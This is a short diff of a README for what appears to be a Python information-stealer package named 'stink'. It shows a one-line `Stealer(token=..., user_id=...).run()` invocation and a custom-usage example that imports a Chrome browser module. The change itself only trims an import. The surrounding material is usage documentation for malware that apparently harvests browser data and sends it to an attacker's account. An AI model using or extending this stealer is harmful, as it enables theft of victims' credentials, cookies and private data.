@@ -52,7 +52,7 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 
 ### Кастомний
 ```python
-from os import path, mkdir
+from os import mkdir
 from getpass import getuser
 
 from stink.browsers.chrome import Chrome
